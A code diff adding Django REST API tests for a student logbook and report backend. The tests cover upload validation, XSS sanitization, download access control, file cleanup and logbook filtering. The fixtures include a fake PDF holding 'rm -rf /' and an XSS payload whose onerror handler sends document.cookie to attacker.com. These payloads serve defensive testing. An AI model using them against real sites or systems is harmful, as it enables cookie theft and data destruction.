@@ -285,3 +285,126 @@ class Log2DefBackendTests(TestCase):
         docs_resp = anon_client.get('/docs/')
         self.assertEqual(docs_resp.status_code, status.HTTP_200_OK)
         self.assertIn(b'swagger-ui', docs_resp.content.lower())
+
+    def test_magic_byte_validation_rejects_spoofed_files(self):
+        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
+        # Disguised executable/bash script claiming to be a PDF
+        spoofed_file = SimpleUploadedFile(
+            'malicious.pdf',
+            b'#!/bin/bash\necho "Attacking system..."\nrm -rf /',
+            content_type='application/pdf'
+        )
+        resp = self.client.post(f'/api/projects/{self.project1.id}/documents/', {'file': spoofed_file}, format='multipart')
+        self.assertEqual(resp.status_code, status.HTTP_400_BAD_REQUEST)
+        self.assertIn('does not match allowed document types', resp.data['error'])
+
+    def test_xss_sanitization_in_section_update(self):
+        generate_full_report(self.project1)
+        section = self.project1.report.sections.first()
+        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
+
+        malicious_payload = (
+            "<p>Valid academic summary.</p>"
+            "<script>alert('xss_attack');</script>"
+            "<img src='invalid.jpg' onerror='fetch(\"http://attacker.com?c=\"+document.cookie)' />"
+            "<a href='javascript:alert(1)'>Click me</a>"
+        )
+        resp = self.client.patch(f'/api/projects/{self.project1.id}/report/sections/{section.id}/', {
+            'content': malicious_payload
+        })
+        self.assertEqual(resp.status_code, status.HTTP_200_OK)
+        section.refresh_from_db()
+
+        # Verify <script>, onerror, and javascript: were completely stripped
+        self.assertNotIn('<script>', section.content)
+        self.assertNotIn('onerror', section.content)
+        self.assertNotIn('javascript:', section.content)
+        self.assertIn('<p>Valid academic summary.</p>', section.content)
+
+    def test_authenticated_source_document_download_and_isolation(self):
+        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
+        # Upload valid PDF
+        valid_pdf_content = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF"
+        pdf_file = SimpleUploadedFile('logbook.pdf', valid_pdf_content, content_type='application/pdf')
+        upload_resp = self.client.post(f'/api/projects/{self.project1.id}/documents/', {'file': pdf_file}, format='multipart')
+        self.assertEqual(upload_resp.status_code, status.HTTP_201_CREATED)
+        doc_id = upload_resp.data['id']
+
+        # 1. User 1 (owner) can download
+        download_resp = self.client.get(f'/api/projects/{self.project1.id}/documents/{doc_id}/download/')
+        self.assertEqual(download_resp.status_code, status.HTTP_200_OK)
+        self.assertIn('attachment', download_resp.get('Content-Disposition', ''))
+
+        # 2. User 2 (unauthorized student) cannot download User 1's document
+        user2_login = self.client.post('/api/auth/login/', {'username': 'student2', 'password': 'StrongPassword123!'})
+        token2 = user2_login.data['access']
+        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {token2}')
+        forbidden_resp = self.client.get(f'/api/projects/{self.project1.id}/documents/{doc_id}/download/')
+        self.assertEqual(forbidden_resp.status_code, status.HTTP_404_NOT_FOUND)
+
+        # 3. Anonymous user cannot download
+        anon_client = APIClient()
+        anon_resp = anon_client.get(f'/api/projects/{self.project1.id}/documents/{doc_id}/download/')
+        self.assertEqual(anon_resp.status_code, status.HTTP_401_UNAUTHORIZED)
+
+    def test_cascade_filesystem_cleanup_on_project_delete(self):
+        from django.conf import settings
+        from pathlib import Path
+
+        # Upload a document to create files in project directory
+        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
+        valid_pdf = SimpleUploadedFile('sample.pdf', b"%PDF-1.4\nsample data\n%%EOF", content_type='application/pdf')
+        self.client.post(f'/api/projects/{self.project1.id}/documents/', {'file': valid_pdf}, format='multipart')
+
+        project_dir = Path(settings.MEDIA_ROOT) / "projects" / str(self.project1.id)
+        self.assertTrue(project_dir.exists())
+
+        # Delete project via API
+        del_resp = self.client.delete(f'/api/projects/{self.project1.id}/')
+        self.assertEqual(del_resp.status_code, status.HTTP_204_NO_CONTENT)
+
+        # Confirm on-disk directory was cascade-removed
+        self.assertFalse(project_dir.exists())
+
+    def test_logbook_and_defence_filtering(self):
+        # Create logbook entries across weeks 1 and 2
+        LogbookEntry.objects.create(
+            project=self.project1,
+            week_number=1,
+            day_of_week='Monday',
+            activity_summary='Orientation and safety induction',
+            is_verified=True
+        )
+        LogbookEntry.objects.create(
+            project=self.project1,
+            week_number=1,
+            day_of_week='Tuesday',
+            activity_summary='Rack cabling review',
+            is_verified=False
+        )
+        LogbookEntry.objects.create(
+            project=self.project1,
+            week_number=2,
+            day_of_week='Monday',
+            activity_summary='Router VLAN configuration',
+            is_verified=True
+        )
+
+        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
+
+        # Filter by week=1
+        resp_week1 = self.client.get(f'/api/projects/{self.project1.id}/logbook-entries/?week=1')
+        self.assertEqual(resp_week1.status_code, status.HTTP_200_OK)
+        self.assertEqual(len(resp_week1.data), 2)
+
+        # Filter by verified=true
+        resp_ver = self.client.get(f'/api/projects/{self.project1.id}/logbook-entries/?verified=true')
+        self.assertEqual(resp_ver.status_code, status.HTTP_200_OK)
+        self.assertEqual(len(resp_ver.data), 2)
+
+        # Filter by week=1 and verified=true
+        resp_w1_ver = self.client.get(f'/api/projects/{self.project1.id}/logbook-entries/?week=1&verified=true')
+        self.assertEqual(resp_w1_ver.status_code, status.HTTP_200_OK)
+        self.assertEqual(len(resp_w1_ver.data), 1)
+        self.assertEqual(resp_w1_ver.data[0]['day_of_week'], 'Monday')
+
